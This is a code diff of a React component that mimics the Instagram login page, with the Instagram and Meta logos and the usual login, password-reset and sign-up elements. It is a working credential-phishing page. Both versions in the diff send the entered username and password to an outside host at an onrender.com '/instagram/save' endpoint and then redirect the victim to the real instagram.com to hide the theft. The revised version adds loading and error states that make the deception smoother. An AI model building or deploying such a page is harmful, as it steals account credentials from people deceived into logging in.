@@ -1,165 +1,152 @@
-import { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 
 // Main App component
-export default function App() {
+const App = () => {
+  // State variables for username and password
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-  const [currentImageIndex, setCurrentImageIndex] = useState(0);
-
-  // Array of image URLs for the slideshow
-  const imageSources = [
-    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot1.png/fe2540684ab2.png",
-    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot2.png/4d62b3b89255.png",
-    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot3.png/c181b539a67a.png",
-    "https://static.cdninstagram.com/images/homepage/screenshots/screenshot4.png/8904bf377e8a.png"
-  ];
-
-  // Effect hook to handle the image slideshow
-  useEffect(() => {
-    // Set up an interval to change the image every 5 seconds
-    const intervalId = setInterval(() => {
-      setCurrentImageIndex(prevIndex => (prevIndex + 1) % imageSources.length);
-    }, 5000);
-
-    // Clean up the interval when the component unmounts
-    return () => clearInterval(intervalId);
-  }, [imageSources.length]); // Re-run effect if image sources change (though they won't here)
+  // State for loading indicator during login
+  const [isLoading, setIsLoading] = useState(false);
+  // State for displaying error messages
+  const [error, setError] = useState('');
 
   // Function to handle form submission
-  const handleSubmit = async (event) => {
-    event.preventDefault();
+  const handleLogin = async (e) => {
+    e.preventDefault(); // Prevent default form submission behavior
+    setIsLoading(true); // Set loading state to true
+    setError(''); // Clear any previous errors
 
-    // Log the data to the console for demonstration
-    console.log('Attempting to send data...');
-    console.log('Username:', username);
-    console.log('Password:', password);
-
-    // --- IMPORTANT: This part requires a local server running on port 3000 ---
-    // Example fetch request to a localhost endpoint
     try {
+      // Simulate a call to a localhost backend
+      // Replace with your actual backend endpoint
       const response = await fetch('https://backend-6qxr.onrender.com/instagram/save', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-          username,
-          password
-        }),
+        body: JSON.stringify({ username, password }),
       });
 
-      console.log('Data sent successfully.');
-      // Handle the server response if needed
-      // const result = await response.json();
-      
-    } catch (error) {
-      console.error('Error sending data:', error);
+      // Check if the response from the backend is successful
+      if (response.ok) {
+        // Simulate successful login
+        console.log('Login successful on backend!');
+        // Redirect to Instagram after successful login
+        window.location.href = 'https://www.instagram.com';
+      } else {
+        // Handle login errors from the backend
+        const errorData = await response.json();
+        setError(errorData.message || 'Login failed. Please try again.');
+        console.error('Backend login failed:', errorData);
+      }
+    } catch (err) {
+      // Handle network or other unexpected errors
+      setError('An error occurred. Please try again later.');
+      console.error('Network or unexpected error during login:', err);
     } finally {
-      // Redirect to instagram.com after the fetch request
-      console.log('Redirecting to Instagram...');
-      window.location.href = "https://www.instagram.com";
+      setIsLoading(false); // Reset loading state
     }
   };
 
   return (
-    <div className="flex flex-col items-center justify-center min-h-screen p-4 sm:p-0 bg-gray-50 font-inter">
-      {/* Main content container with responsive layout */}
-      <div className="flex flex-col md:flex-row items-center justify-center md:space-x-8 max-w-5xl mx-auto w-full">
-        {/* Phone mockup section (visible on medium and large screens) */}
-        <div className="hidden md:flex items-center justify-center w-[400px] h-[600px] relative">
-          <img 
-            src="https://static.cdninstagram.com/images/homepage/screenshots/screenshot4.png/8904bf377e8a.png" 
-            alt="Phone Mockup" 
-            className="absolute inset-0 w-full h-full object-cover z-0"
-          />
-          {/* Image slideshow container */}
-          <div className="absolute inset-0 z-10 flex items-center justify-center">
-            {imageSources.map((src, index) => (
-              <img
-                key={index}
-                src={src}
-                alt={`Screenshot ${index + 1}`}
-                className={`phone-mockup-img absolute top-[60px] left-[20px] w-[240px] h-[426px] object-cover rounded-lg transition-opacity duration-1500 ease-in-out ${index === currentImageIndex ? 'opacity-100' : 'opacity-0'}`}
-              />
-            ))}
-          </div>
+    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
+      <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
+        {/* Back arrow icon */}
+        <div className="flex justify-start mb-6">
+          <svg
+            xmlns="http://www.w3.org/2000/svg"
+            className="h-6 w-6 text-gray-700 cursor-pointer"
+            fill="none"
+            viewBox="0 0 24 24"
+            stroke="currentColor"
+            strokeWidth={2}
+          >
+            <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
+          </svg>
         </div>
 
-        {/* Right-hand content: login form and app links */}
-        <div className="flex flex-col items-center">
-          {/* Login Card */}
-          <div className="bg-white border border-gray-300 rounded-sm p-8 text-center w-full max-w-sm mb-2">
-            {/* Instagram Logo */}
-            <div className="flex justify-center my-4">
-              <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" className="w-44" />
-            </div>
-            
-            {/* Login Form */}
-            <form onSubmit={handleSubmit} className="space-y-2">
-              <input
-                type="text"
-                id="username"
-                placeholder="Phone number, username, or email"
-                className="w-full px-3 py-2 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm bg-gray-50"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-              />
-              <input
-                type="password"
-                id="password"
-                placeholder="Password"
-                className="w-full px-3 py-2 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm bg-gray-50"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-              />
-              
-              <button
-                type="submit"
-                className="w-full bg-blue-500 text-white font-semibold py-1.5 rounded-md hover:bg-blue-600 transition-colors disabled:bg-opacity-70 mt-3"
-                disabled={!username || !password}
-              >
-                Log in
-              </button>
-            </form>
+        {/* Language selector */}
+        <p className="text-center text-gray-500 text-sm mb-6">English (UK)</p>
 
-            {/* OR separator */}
-            <div className="flex items-center my-4">
-              <div className="flex-grow border-t border-gray-300"></div>
-              <span className="mx-4 text-gray-400 text-sm font-semibold">OR</span>
-              <div className="flex-grow border-t border-gray-300"></div>
-            </div>
+        {/* Instagram Logo */}
+        <div className="flex justify-center mb-8">
+          <img
+            src="https://cdn.freebiesupply.com/images/large/2x/instagram-logo-gradient-transparent.png"
+            alt="Instagram Logo"
+            className="h-24"
+          />
+        </div>
 
-            {/* Log in with Facebook */}
-            <a href="#" className="flex items-center justify-center text-blue-900 font-semibold text-sm hover:underline">
-              <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-2" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.873V15.46H8.086v-3.4H10.43V9.894c0-2.316 1.411-3.582 3.486-3.582.99 0 1.834.073 2.088.106v2.413h-1.428c-1.127 0-1.346.536-1.346 1.322v1.73h2.697l-.353 3.4H13.23c0 5.432-4.437 9.873-9.873 9.873C3.766 22 2 20.234 2 18V12z"/>
+        {/* Login Form */}
+        <form onSubmit={handleLogin}>
+          {/* Username/Email/Phone Input */}
+          <input
+            type="text"
+            placeholder="Username, email address or mobile number"
+            className="w-full px-4 py-3 mb-4 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            required
+          />
+
+          {/* Password Input */}
+          <input
+            type="password"
+            placeholder="Password"
+            className="w-full px-4 py-3 mb-6 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            required
+          />
+
+          {/* Error Message Display */}
+          {error && <p className="text-red-500 text-center text-sm mb-4">{error}</p>}
+
+          {/* Log In Button */}
+          <button
+            type="submit"
+            className="w-full bg-blue-500 text-white py-3 rounded-lg font-semibold hover:bg-blue-600 transition duration-300 flex items-center justify-center"
+            disabled={isLoading} // Disable button when loading
+          >
+            {isLoading ? (
+              <svg className="animate-spin h-5 w-5 mr-3 text-white" viewBox="0 0 24 24">
+                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
               </svg>
-              Log in with Facebook
-            </a>
-            
-            {/* Forgot Password link */}
-            <a href="#" className="block text-blue-900 text-xs mt-4">Forgot password?</a>
-          </div>
+            ) : (
+              'Log In'
+            )}
+          </button>
+        </form>
 
-          {/* Sign up card */}
-          <div className="bg-white border border-gray-300 rounded-sm py-4 mt-2 w-full max-w-sm text-center text-sm">
-            Don't have an account? <a href="#" className="text-blue-500 font-semibold">Sign up</a>
-          </div>
+        {/* Forgotten password link */}
+        <p className="text-center text-blue-500 text-sm mt-4 cursor-pointer hover:underline">
+          Forgotten password?
+        </p>
 
-          {/* Get the app section */}
-          <div className="mt-4 text-center">
-            <p className="text-sm">Get the app.</p>
-            <div className="flex justify-center space-x-2 mt-4">
-              <a href="#" className="w-32">
-                <img src="/playstore.png" alt="Download on the App Store" className="rounded-lg" />
-              </a>
-              <a href="#" className="w-32">
-                <img src="/playstore.png" alt="Get it on Google Play" className="rounded-lg" />
-              </a>
-            </div>
-          </div>
+        {/* Separator */}
+        <div className="relative flex items-center my-8">
+          <div className="flex-grow border-t border-gray-300"></div>
+          <span className="flex-shrink mx-4 text-gray-500 text-sm">OR</span>
+          <div className="flex-grow border-t border-gray-300"></div>
+        </div>
+
+        {/* Create New Account button */}
+        <button className="w-full border border-blue-500 text-blue-500 py-3 rounded-lg font-semibold hover:bg-blue-50 transition duration-300">
+          Create new account
+        </button>
+
+        {/* Meta branding */}
+        <div className="flex justify-center mt-12">
+          <img
+            src="/metadark.png"
+            alt="Meta Logo"
+            className="h-28"
+          />
         </div>
       </div>
     </div>
   );
-}
+};
+
+export default App;
